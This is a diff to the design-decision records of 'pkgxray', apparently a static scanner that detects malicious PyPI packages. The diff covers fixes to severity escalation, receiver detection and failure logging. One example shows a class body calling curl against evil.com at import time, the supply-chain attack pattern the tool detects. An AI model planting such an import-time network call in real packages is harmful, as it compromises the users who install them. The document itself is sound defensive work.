@@ -47,8 +47,8 @@ All analysis is performed via `ast.parse()` on the raw source text. The package 
 
 ## ADR-003: Fail-Open Per Analyser
 
-**Status:** Accepted
-**Date:** 2024 (initial design)
+**Status:** Accepted — updated v0.3.0
+**Date:** 2024 (initial design) · Updated 2026 (v0.3.0)
 
 ### Decision
 Every `analyzer.analyze()` call in the orchestrator is wrapped in `try/except Exception: continue`. A crash in one analyser never aborts the rest of the scan.
@@ -58,9 +58,9 @@ Every `analyzer.analyze()` call in the orchestrator is wrapped in `try/except Ex
 - A parse error in an unusual Python file (e.g. using Python 3.13+ syntax on a 3.9 runner) should degrade gracefully, not crash the tool.
 
 ### Consequences
-- Analyser bugs are silently swallowed unless tests catch them.
-- There is currently no telemetry or logging when an analyser fails — failures are invisible in production.
-- Future improvement: log analyser failures at DEBUG level.
+- ~~Analyser bugs are silently swallowed unless tests catch them.~~
+- **v0.3.0 update (P4-04):** The silent `continue` was replaced by `logger.warning(analyzer_name, filename, error)`. Users can enable visibility with `--verbose` (CLI) or `logging.basicConfig(level=logging.DEBUG)` (API). Fail-open behaviour is preserved.
+- Failures remain non-fatal by design (ADR-003 unchanged); only observability improved.
 
 ---
 
@@ -132,26 +132,35 @@ Combo bonuses add signal for multi-category packages: a package that BOTH exfilt
 
 ## ADR-005: Severity Escalation at Module Level
 
-**Status:** Accepted — known gap
-**Date:** 2024 (initial design)
+**Status:** Accepted — gap fixed in v0.3.0
+**Date:** 2024 (initial design) · Fixed 2026 (v0.3.0, P2-04 + P2-05)
 
 ### Decision
-Any dangerous call (subprocess, network, code execution) that appears at the top level of a module (outside any function or class) is automatically escalated to `CRITICAL` severity, regardless of its base severity.
+Any dangerous call (subprocess, network, code execution, dynamic import, env access, filesystem destructive op) that appears at the top level of a module — or in a class body — is automatically escalated to `CRITICAL` severity, regardless of its base severity.
 
 ### Rationale
 - Module-level code runs automatically when the package is imported, requiring no further user action beyond installation.
-- This is the canonical attack pattern in PyPI supply-chain attacks: placing `subprocess.run(["curl", ...])` at the top of `__init__.py`.
+- Class-body code also runs at class-definition time, which happens at import time for top-level classes. The risk is identical to bare module-level code.
+- This is the canonical attack pattern in PyPI supply-chain attacks.
 
-### Known Gap
-`is_module_level()` walks upward through parent nodes and returns `False` if any ancestor is a `ClassDef`. This means code in a class body (but outside a method) is NOT classified as module-level, even though it executes when the class is defined at import time.
+### v0.3.0 Fix (P2-04)
+`is_module_level()` previously returned `False` for nodes inside a `ClassDef`, missing class-body attacks:
 
 ```python
-class Foo:
-    subprocess.run(["curl", "http://evil.com"])  # runs at import time, but scored as HIGH not CRITICAL
+class Backdoor:
+    subprocess.run(["curl", "http://evil.com"])  # now correctly → CRITICAL
 ```
 
-### Proposed Fix
-Modify `is_module_level()` to treat class-body code as module-level (i.e. only return `False` for `FunctionDef` and `AsyncFunctionDef` ancestors, not `ClassDef`).
+`ClassDef` was removed from the barrier set. Only `FunctionDef` and `AsyncFunctionDef` return `False`.
+
+### v0.3.0 Extension (P2-05)
+Module-level escalation extended to three previously uncovered analysers:
+- `filesystem.py` — destructive calls (`remove`, `unlink`, `rmtree`) at module level → CRITICAL
+- `env_access.py` — sensitive env reads (HIGH/MEDIUM) at module level → CRITICAL; LOW stays LOW
+- `dynamic_imports.py` — `__import__` / `importlib.import_module` at module level → CRITICAL
+
+### Remaining Limitation
+Code inside methods of module-level classes correctly stays at its base severity when inside a method body (`FunctionDef` is still a barrier). This is correct behaviour.
 
 ---
 
@@ -187,10 +196,49 @@ Analysers that detect method calls check the *receiver* object's name before fla
 - Pure regex scanning produces an unacceptable number of false positives for common method names.
 - The AST gives us the receiver as an `ast.Name` node, which we can inspect.
 
-### Known Limitation
-Receiver identification only works when the receiver is a direct `ast.Name` node (a simple variable name). If the receiver is a chained attribute access (e.g., `self.session.get(...)`), `func.value` is an `ast.Attribute`, not `ast.Name`, so `receiver` becomes an empty string and the call is **not** flagged.
+### v0.3.0 Fix (P2-02)
+`_extract_receiver_name()` helper added to `network.py`. It resolves chained attribute chains by returning the innermost attribute name:
 
-This means OOP-style HTTP clients are systematically missed by `NetworkAnalyzer`. See `docs/QUANTA.md` for the full issue.
+```python
+# Before: self.session.get(url) → receiver="" → NOT flagged
+# After:  self.session.get(url) → receiver="session" → "session" ∈ _KNOWN_HTTP_RECEIVERS → HIGH
+```
 
-### Proposed Fix
-Recurse into `ast.Attribute` chains to extract the final attribute name as a secondary receiver candidate, or check `func.attr` (the method name) independently with a wider allow-list.
+Applied to HTTP method detection and `connect()` DB-exclusion logic.
+
+### v0.3.0 Extension (P2-01)
+Receiver filtering extended to `filesystem.py` for `remove` and `unlink`:
+- `list.remove(x)` / `set.remove(x)` → no longer false positives
+- `os.remove(f)` / `Path("f").unlink()` → still flagged (receiver ∈ `{os, pathlib, Path}`)
+- `shutil.rmtree(d)` → always flagged (unambiguous, no receiver check needed)
+
+### Remaining Limitation
+Aliased receivers are still not tracked across statements:
+
+```python
+import requests as r
+r.get(url)  # receiver "r" not in _KNOWN_HTTP_RECEIVERS → missed (out of scope v0.3)
+```
+
+---
+
+## ADR-008: Binary Extension Analysis — Out of Scope for v0.3
+
+**Status:** Proposed — deferred to future version
+**Date:** 2026 (v0.3.0 research)
+
+### Context
+PyPI packages often include compiled extensions (`.so` on Linux/macOS, `.pyd` on Windows). These are binary files that `ast.parse()` cannot read. A malicious actor could place an attack payload entirely inside a compiled extension and pkgxray would not detect it.
+
+### Decision
+Binary analysis is explicitly out of scope for v0.3.0. pkgxray only analyses Python source files.
+
+### Rationale
+- Binary analysis requires platform-specific disassembly tooling (e.g. `objdump`, `otool`, `dumpbin`) or a Python library like `lief` or `pyelftools`, which would violate the minimal-dependency principle (ADR-002).
+- The primary attack vectors observed in PyPI supply-chain incidents (2022–2025) overwhelmingly use Python source code — in `setup.py`, `__init__.py`, or inline modules — not compiled extensions.
+- A future `binary_extensions` analyser could flag packages that include `.so`/`.pyd` files and optionally check their imported symbols for suspicious names (e.g. `system`, `execve`, `socket`).
+
+### Consequences
+- Packages that hide malicious logic entirely in compiled extensions will not be flagged.
+- The scan result's `skipped_files` list already captures files that could not be analysed, providing transparency.
+- This limitation is documented in Section 8 (Assumption #3) of the project instructions.
